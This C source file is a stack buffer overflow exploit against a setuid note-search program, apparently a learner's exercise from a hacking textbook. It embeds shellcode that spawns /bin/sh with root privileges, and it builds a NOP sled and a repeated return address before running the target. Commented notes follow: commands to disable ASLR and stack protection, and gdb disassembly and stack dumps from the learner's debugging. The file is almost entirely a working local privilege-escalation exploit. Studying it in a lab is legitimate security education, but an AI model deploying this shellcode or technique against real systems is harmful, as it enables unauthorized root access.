#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// TODO review and fix
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
  unsigned int i, *ptr, ret, offset=270;
  char *command, *buffer;

  command = (char *) malloc(200);
  bzero(command, 200); // Zero out the new memory.

  strcpy(command, "./notesearch.out \'"); // Start command buffer.
  buffer = command + strlen(command); // Set buffer at the end.

  if (argc > 1) // Set offset.
    offset = atoi(argv[1]);

  ret = (unsigned int) &i - offset; // Set return address.
  for (i=0; i < 160; i+=4) // Fill buffer with return 4-byte address.
    *((unsigned int *)(buffer+i)) = ret;

  memset(buffer, 0x90, 60); // Build NOP sled.
  memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

  strcat(command, "\'");

  system(command); // Run exploit.
  free(command);
}

/*

sysctl -w kernel.randomize_va_space=0

gcc -g ../chapter02/notetaker.c -o notetaker.out
gcc -g -m32 -fno-stack-protector -z execstack -fno-pie -no-pie -z norelro ../chapter02/notesearch.c -o notesearch.out
gcc -g -m32 -fno-stack-protector -z execstack -fno-pie -no-pie -z norelro exploit_notesearch.c -o exploit_notesearch.out

./notetaker.out "hello world"
./exploit_notesearch.out

???

##############################

# size without causing "Segmentation fault"
./notesearch.out $(perl -e 'print "A"x115')

gdb -q notesearch.out 
Reading symbols from notesearch.out...done.
(gdb) disassemble main 
  Dump of assembler code for function main:
  0x080486df <+0>:	lea    ecx,[esp+0x4]
  0x080486e3 <+4>:	and    esp,0xfffffff0
  0x080486e6 <+7>:	push   DWORD PTR [ecx-0x4]
  0x080486e9 <+10>:	push   ebp
  0x080486ea <+11>:	mov    ebp,esp
  0x080486ec <+13>:	push   ecx
  0x080486ed <+14>:	sub    esp,0x74
  0x080486f0 <+17>:	mov    eax,ecx
  0x080486f2 <+19>:	mov    DWORD PTR [ebp-0xc],0x1
  0x080486f9 <+26>:	cmp    DWORD PTR [eax],0x1
  0x080486fc <+29>:	jle    0x8048718 <main+57>                ; ARGC > 1
  0x080486fe <+31>:	mov    eax,DWORD PTR [eax+0x4]            ; YES
  0x08048701 <+34>:	add    eax,0x4
  0x08048704 <+37>:	mov    eax,DWORD PTR [eax]
  0x08048706 <+39>:	sub    esp,0x8
  0x08048709 <+42>:	push   eax
  0x0804870a <+43>:	lea    eax,[ebp-0x78]
  0x0804870d <+46>:	push   eax
  0x0804870e <+47>:	call   0x80484a0 <strcpy@plt>
  0x08048713 <+52>:	add    esp,0x10
  0x08048716 <+55>:	jmp    0x804871c <main+61>
  0x08048718 <+57>:	mov    BYTE PTR [ebp-0x78],0x0            ; NO
  0x0804871c <+61>:	call   0x8048480 <getuid@plt>
  0x08048721 <+66>:	mov    DWORD PTR [ebp-0x10],eax
  0x08048724 <+69>:	sub    esp,0x8
  0x08048727 <+72>:	push   0x0
  0x08048729 <+74>:	push   0x8048a34
  0x0804872e <+79>:	call   0x80484e0 <open@plt>
  0x08048733 <+84>:	add    esp,0x10
  0x08048736 <+87>:	mov    DWORD PTR [ebp-0x14],eax
  0x08048739 <+90>:	cmp    DWORD PTR [ebp-0x14],0xffffffff
  0x0804873d <+94>:	jne    0x8048769 <main+138>
  0x0804873f <+96>:	sub    esp,0xc
  0x08048742 <+99>:	push   0x8048a40
  0x08048747 <+104>:	call   0x8048656 <fatal>
  0x0804874c <+109>:	add    esp,0x10
  0x0804874f <+112>:	jmp    0x8048769 <main+138>
  0x08048751 <+114>:	sub    esp,0x4
  0x08048754 <+117>:	lea    eax,[ebp-0x78]
  0x08048757 <+120>:	push   eax
  0x08048758 <+121>:	push   DWORD PTR [ebp-0x10]
  0x0804875b <+124>:	push   DWORD PTR [ebp-0x14]
  0x0804875e <+127>:	call   0x804879a <print_notes>
  0x08048763 <+132>:	add    esp,0x10
  0x08048766 <+135>:	mov    DWORD PTR [ebp-0xc],eax
  0x08048769 <+138>:	cmp    DWORD PTR [ebp-0xc],0x0
  0x0804876d <+142>:	jne    0x8048751 <main+114>
  0x0804876f <+144>:	sub    esp,0xc
  0x08048772 <+147>:	push   0x8048a6c
  0x08048777 <+152>:	call   0x80484c0 <puts@plt>
  0x0804877c <+157>:	add    esp,0x10
  0x0804877f <+160>:	sub    esp,0xc
  0x08048782 <+163>:	push   DWORD PTR [ebp-0x14]
  0x08048785 <+166>:	call   0x8048510 <close@plt>
  0x0804878a <+171>:	add    esp,0x10
  0x0804878d <+174>:	mov    eax,0x0
  0x08048792 <+179>:	mov    ecx,DWORD PTR [ebp-0x4]
  0x08048795 <+182>:	leave  
  0x08048796 <+183>:	lea    esp,[ecx-0x4]
  0x08048799 <+186>:	ret    
End of assembler dump.

(gdb) disassemble print_notes 
Dump of assembler code for function print_notes:
  0x0804879a <+0>:	push   ebp
  0x0804879b <+1>:	mov    ebp,esp
  0x0804879d <+3>:	sub    esp,0x78
  0x080487a0 <+6>:	mov    BYTE PTR [ebp-0x9],0x0
  0x080487a4 <+10>:	sub    esp,0x8                          ; before find_user_note
  0x080487a7 <+13>:	push   DWORD PTR [ebp+0xc]
  0x080487aa <+16>:	push   DWORD PTR [ebp+0x8]
  0x080487ad <+19>:	call   0x8048811 <find_user_note>
  0x080487b2 <+24>:	add    esp,0x10
  0x080487b5 <+27>:	mov    DWORD PTR [ebp-0x10],eax
  0x080487b8 <+30>:	cmp    DWORD PTR [ebp-0x10],0xffffffff
  0x080487bc <+34>:	jne    0x80487c5 <print_notes+43>
  0x080487be <+36>:	mov    eax,0x0
  0x080487c3 <+41>:	jmp    0x804880f <print_notes+117>
  0x080487c5 <+43>:	sub    esp,0x4
  0x080487c8 <+46>:	push   DWORD PTR [ebp-0x10]
  0x080487cb <+49>:	lea    eax,[ebp-0x74]
  0x080487ce <+52>:	push   eax
  0x080487cf <+53>:	push   DWORD PTR [ebp+0x8]
  0x080487d2 <+56>:	call   0x8048450 <read@plt>
  0x080487d7 <+61>:	add    esp,0x10
  0x080487da <+64>:	lea    edx,[ebp-0x74]
  0x080487dd <+67>:	mov    eax,DWORD PTR [ebp-0x10]
  0x080487e0 <+70>:	add    eax,edx
  0x080487e2 <+72>:	mov    BYTE PTR [eax],0x0
  0x080487e5 <+75>:	sub    esp,0x8
  0x080487e8 <+78>:	push   DWORD PTR [ebp+0x10]
  0x080487eb <+81>:	lea    eax,[ebp-0x74]
  0x080487ee <+84>:	push   eax
  0x080487ef <+85>:	call   0x80488da <search_note>
  0x080487f4 <+90>:	add    esp,0x10
  0x080487f7 <+93>:	test   eax,eax
  0x080487f9 <+95>:	je     0x804880a <print_notes+112>
  0x080487fb <+97>:	sub    esp,0xc
  0x080487fe <+100>:	lea    eax,[ebp-0x74]
  0x08048801 <+103>:	push   eax
  0x08048802 <+104>:	call   0x8048460 <printf@plt>
  0x08048807 <+109>:	add    esp,0x10
  0x0804880a <+112>:	mov    eax,0x1
  0x0804880f <+117>:	leave  
  0x08048810 <+118>:	ret    
End of assembler dump.

# strcpy
(gdb) break 19
# print_notes
(gdb) break 30
# inside print_notes
(gdb) break 42

run $(perl -e 'print "A"x115')

# before entering print_notes
esp = 0xffffd680

(gdb) x/120xw $esp
0xffffd5c0:	0xf7fce110	0x00000065	0x00000000	0x00000006
0xffffd5d0:	0xf7fce110	0x00000000	0xffffd668	[ 0x080487f4 ]  ; EIP after search_note 
0xffffd5e0:	0xffffd5f4	[ 0xffffd680 ]	0x00000006	0x08048323
0xffffd5f0:	0x08049dd8	0x6c6c6568	0x08000a6f	0xf7ffd940
0xffffd600:	0xffffd634	0xf7ffdaf8	0xf7fce410	0x00000001
0xffffd610:	0x00000001	0x00000000	0xf7fce410	0x00000001
0xffffd620:	0xf7ffd000	0x080482bc	0x00000000	0x00000000
0xffffd630:	0xf7ffd000	0xf7df9668	0x00000000	0x00000000
0xffffd640:	0xffffd6f8	0x00000000	0x08048a34	0xf7ed481e
0xffffd650:	0xffffd6f8	0xf7feade0	0x00000006	0x00ed47e0
0xffffd660:	0x00000000	0xf7fc6000	0xffffd6f8	0x08048763
0xffffd670:	0x00000003	0x00000000	[ 0xffffd680 ]	0x08048721  ; ESP in main
0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x00000003	0x00000000	0x41414141
0xffffd6f0:	0x00414141	0xffffd710	0x00000000	0xf7e06f21
0xffffd700:	0xf7fc6000	0xf7fc6000	0x00000000	0xf7e06f21
0xffffd710:	0x00000002	0xffffd7a4	0xffffd7b0	0xffffd734
0xffffd720:	0x00000001	0x00000000	0xf7fc6000	0xf7fe571a
0xffffd730:	0xf7ffd000	0x00000000	0xf7fc6000	0x00000000
0xffffd740:	0x00000000	0x7259ce55	0x4d2a2845	0x00000000
0xffffd750:	0x00000000	0x00000000	0x00000002	0x08048540      ; <<< should i overflow until here ?!
0xffffd760:	0x00000000	0xf7feade0	0xf7fe5970	0x08049da8
0xffffd770:	0x00000002	0x08048540	0x00000000	0x08048572
0xffffd780:	0x080486df	0x00000002	0xffffd7a4	0x08048990
0xffffd790:	0x080489f0	0xf7fe5970	0xffffd79c	0xf7ffd940

*/
